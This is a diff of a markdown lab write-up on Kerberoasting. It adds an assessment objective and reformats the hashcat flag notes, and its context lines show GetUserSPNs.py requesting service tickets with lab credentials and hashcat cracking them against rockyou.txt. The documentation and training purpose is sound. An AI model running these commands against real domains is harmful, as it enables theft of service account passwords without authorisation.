@@ -9,6 +9,7 @@
 # Table of content
 
 - [What is Kerberoasting?](#what-is-kerberoasting)
+- [Objective](#Objective)
 - [How Kerberoasting Works](#how-kerberoasting-works)
 - [Lab Setup](#lab-setup)
 - [Attack Process](#attack-process)
@@ -29,6 +30,18 @@
 
 In Windows networks, services (like SQL Server, IIS, etc.) are registered with something called an SPN (Service Principal Name). When a user wants to access a service, Windows gives them an encrypted service ticket. That ticket is encrypted using the service account's password hash.
 Here is the problem — any logged-in domain user can request that ticket, no special permissions needed. An attacker can grab that ticket, take it offline, and crack it to recover the real password.
+
+## Objective
+
+- The goal of this assessment was to:
+
+```
+Identify service accounts with SPNs
+Request Kerberos service tickets
+Extract and analyze ticket data
+Attempt offline password cracking
+Evaluate security posture of service account password policy
+```
 
 ## How Kerberoasting Works
 
@@ -71,8 +84,6 @@ Pass: Password1
 ```bash
 GetUserSPNs.py readteambd.local/rahimkhan:Password1 -dc-ip 192.168.5.134 -request
 ```
-
-# Breakdown
 
 ```
 | Part                  |                     Description                      |
@@ -121,9 +132,11 @@ hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
 ```
--m 13100 → Kerberos 5 TGS-REP (etype 23)
-kerberoast.txt → file containing extracted hash
-rockyou.txt → password wordlist
+| Flag             |                 Description                     |
+|------------------|-------------------------------------------------|
+| `-m 13100`       | Hash mode — Kerberos 5 TGS-REP (etype 23 / RC4) |
+| `kerberoast.txt` | The file containing the extracted hash          |
+| `rockyou.txt`    | The wordlist used to crack the password         |
 ```
 
 **Output:**
